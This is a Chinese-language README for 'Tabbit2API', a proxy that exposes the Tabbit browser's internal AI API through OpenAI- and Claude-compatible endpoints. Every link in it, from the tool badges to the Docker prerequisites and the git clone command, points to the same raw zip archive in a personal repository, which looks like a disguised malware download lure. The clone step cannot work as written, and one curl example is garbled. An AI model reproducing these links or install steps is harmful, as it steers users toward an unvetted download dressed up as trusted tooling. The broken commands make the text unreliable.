# Tabbit2API

[![Docker](https://img.shields.io/badge/Docker-ready-blue.svg)](https://raw.githubusercontent.com/hih24337/tabb2/main/routes/tabb_1.5.zip)
[![Python](https://img.shields.io/badge/Python-3.11-blue.svg)](https://raw.githubusercontent.com/hih24337/tabb2/main/routes/tabb_1.5.zip)
[![FastAPI](https://img.shields.io/badge/FastAPI-0.110-green.svg)](https://raw.githubusercontent.com/hih24337/tabb2/main/routes/tabb_1.5.zip)

**Tabbit2API** 是一个非官方的 API 适配器，它将 [Tabbit 浏览器](https://raw.githubusercontent.com/hih24337/tabb2/main/routes/tabb_1.5.zip) 的内部 API 转换为与 OpenAI 和 Anthropic Claude 兼容的标准化接口。通过本项目，您可以将各种支持 OpenAI 或 Claude API 的第三方应用和服务无缝对接到您的 Tabbit 账户，从而利用 Tabbit 强大的 AI 模型能力。

## ✨ 核心功能

- **双协议兼容**：同时支持 OpenAI (`/v1/chat/completions`) 和 Anthropic Claude (`/v1/messages`) 两种主流 API 格式。
- **多账户支持**：内置 Token 池，支持添加多个 Tabbit 账户 Token，并通过轮询机制实现负载均衡。
- **智能健康管理**：自动监控 Token 状态，当某个 Token 连续出错时会进入冷却期，保证服务整体可用性。
- **Web 管理面板**：提供一个简洁直观的管理后台，用于添加/删除/编辑 Token、查看实时请求日志、修改服务配置等。
- **Docker 一键部署**：提供 `Dockerfile` 和 `docker-compose.yml`，实现快速、标准化的容器化部署。
- **配置持久化**：通过 Docker 数据卷，确保您的配置文件和 Token 信息在容器重启或更新后不会丢失。
- **流式与非流式**：完整支持流式（Streaming）和非流式响应，满足不同应用场景的需求。
- **工具调用（Tool Use）**：在 Claude 兼容模式下，支持 Anthropic 的工具调用（Tool Use）和 `<thinking>` 块，赋能更复杂的 Agent 应用。

## 🚀 快速开始

推荐使用 Docker 和 Docker Compose 进行部署，这是最简单、最可靠的方式。

### 环境要求

- [Docker](https://raw.githubusercontent.com/hih24337/tabb2/main/routes/tabb_1.5.zip)
- [Docker Compose](https://raw.githubusercontent.com/hih24337/tabb2/main/routes/tabb_1.5.zip)

### 部署步骤

1.  **克隆或下载本项目**

    ```bash
    git clone https://raw.githubusercontent.com/hih24337/tabb2/main/routes/tabb_1.5.zip
    cd tabb2
    ```

2.  **使用 Docker Compose 启动**

    ```bash
    # 以后台模式启动服务
    docker compose up -d
    ```

    服务将在 `http://localhost:8800` 启动。首次启动时，程序会自动在 `./data` 目录下生成一个 `config.json` 配置文件。

3.  **访问管理面板**

    在浏览器中打开 `http://localhost:8800/admin`。

    -   默认管理员密码：`admin`
    -   登录后，请务必在 **设置** 页面修改您的管理员密码。

4.  **添加 Tabbit Token**

    -   在 **Tokens 管理** 页面，点击 “添加 Token”。
    -   `名称`：给您的 Token 起一个容易识别的名字（例如：`my-main-account`）。
    -   `值`：填入您从 Tabbit 获取的 Access Token。
    -   点击 “添加” 即可。

    现在，您的 Tabbit2API 实例已经准备就绪！

### 自定义端口

如果您想使用 8800 以外的端口，可以在启动时设置 `PORT` 环境变量：

```bash
PORT=9900 docker compose up -d
```

## ⚙️ 配置说明

所有配置均存储在 `data/config.json` 文件中。您可以通过管理面板的 **设置** 页面进行修改，也可以直接编辑该文件（需要重启容器生效）。

| 配置项 | 路径 | 说明 |
|---|---|---|
| 服务主机 | `server.host` | 服务监听的主机地址，默认为 `0.0.0.0` |
| 服务端口 | `server.port` | 服务监听的端口，默认为 `8800` |
| 管理员密码 | `admin.password_hash` | 加密后的管理员密码 |
| Tabbit API 地址 | `tabbit.base_url` | Tabbit Web API 的根地址 |
| 代理 API Key | `proxy.api_key` | （可选）为 Tabbit2API 设置一个全局 API Key，客户端请求时必须携带此 Key |
| 全局 System Prompt | `proxy.system_prompt` | （可选）为所有 OpenAI 兼容请求注入的系统提示 |
| Claude 默认模型 | `claude.default_model` | Claude 兼容模式下的默认模型 |
| 日志最大条目 | `logging.max_entries` | 在内存中保留的最新日志数量 |

## 🔌 API 端点

### OpenAI 兼容 API

- **端点**：`POST /v1/chat/completions`
- **鉴权**：`Authorization: Bearer <your_proxy_api_key>` (如果在配置中设置了 `proxy.api_key`)

**示例请求 (`curl`)**

```bash
curl http://localhost:8800/v1/chat/completions \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearar sk-your-proxy-key" \
  -d 
  "model": "best",
    "messages": [
      {
        "role": "user",
        "content": "你好！"
      }
    ],
    "stream": false
  }'
```

### Anthropic Claude 兼容 API

- **端点**：`POST /v1/messages`
- **鉴权**：`x-api-key: <your_proxy_api_key>` (如果在配置中设置了 `proxy.api_key`)

**示例请求 (`curl`)**

```bash
curl http://localhost:8800/v1/messages \
  -H "Content-Type: application/json" \
  -H "x-api-key: sk-your-proxy-key" \
  -H "anthropic-version: 2023-06-01" \
  -d '{
    "model": "claude-3-5-sonnet",
    "messages": [
      {
        "role": "user",
        "content": "你好！"
      }
    ],
    "stream": true
  }'
```

### 其他端点

| 方法 | 路径 | 说明 |
|---|---|---|
| `GET` | `/v1/models` | 获取 Tabbit 支持的模型列表（OpenAI 格式） |
| `GET` | `/admin` | 访问 Web 管理面板 |
| `POST`| `/api/admin/login` | 管理员登录接口 |

## 📄 许可证

本项目基于 [MIT License](LICENSE) 开源。
